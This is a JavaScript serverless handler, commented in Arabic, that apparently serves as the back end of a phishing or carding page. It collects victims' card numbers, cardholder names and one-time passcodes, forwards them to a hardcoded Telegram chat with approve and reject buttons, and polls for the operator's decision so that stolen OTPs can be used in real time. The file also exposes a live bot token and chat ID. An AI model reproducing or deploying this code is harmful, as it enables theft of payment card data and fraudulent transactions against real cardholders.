export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const OTP_BOT_TOKEN = "9264807725:AAEtg1bnRFmHq0MnOJu_WAlDQePrDI_Wxc4";
  const CHAT_ID = "8278749797";
  const method = req.method;
  const body = req.body || {};

  // 1. فحص الحالة (GET) - يتحقق مباشرة من تيليجرام ويعيد النتيجة للموقع فوراً
  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/getUpdates?allowed_updates=["callback_query"]`);
      const tgData = await tgRes.json();

      let status = 'pending';
      let callbackQueryId = null;

      if (tgData.ok && tgData.result) {
        for (let i = tgData.result.length - 1; i >= 0; i--) {
          const update = tgData.result[i];
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data === `approve_otp_${user_id}` || data === `approve_${user_id}`) {
              status = 'approved';
              callbackQueryId = update.callback_query.id;
              break;
            } else if (data === `reject_otp_${user_id}` || data === `reject_${user_id}`) {
              status = 'rejected';
              callbackQueryId = update.callback_query.id;
              break;
            }
          }
        }
      }

      // تأكيد الضغطة لدى تليجرام لكي تختفي علامة التحميل من الزر
      if (callbackQueryId) {
        await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: callbackQueryId, text: "تم التحقق والانتقال بنجاح!" })
        }).catch(() => {});
      }

      return res.status(200).json({ status });
    } catch (e) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. إرسال كود الـ OTP أو طلب التحقق إلى البوت (POST)
  if (method === 'POST') {
    const userId = body.user_id || Date.now().toString();
    const otpCode = body.رمز_التحقق_OTP || body.otp || '';
    const cardNum = body.رقم_البطاقة || body.card_number || 'غير متوفر';
    const fullName = body.اسم_الحامل || body.الاسم_الكامل || 'غير متوفر';

    const text = `🔐 *طلب تحقق جديد*\n\n` +
                 `🔑 الكود / البيانات: \`${otpCode}\`\n` +
                 `💳 البطاقة: \`${cardNum}\`\n` +
                 `👤 الاسم: ${fullName}\n` +
                 `🆔 معرف الجلسة: \`${userId}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_otp_${userId}` },
          { text: "❌ رفض", callback_data: `reject_otp_${userId}` }
        ]
      ]
    };

    try {
      await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'Markdown',
          reply_markup: keyboard
        })
      });

      return res.status(200).json({ ok: true, user_id: userId });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(200).json({ ok: true });
}
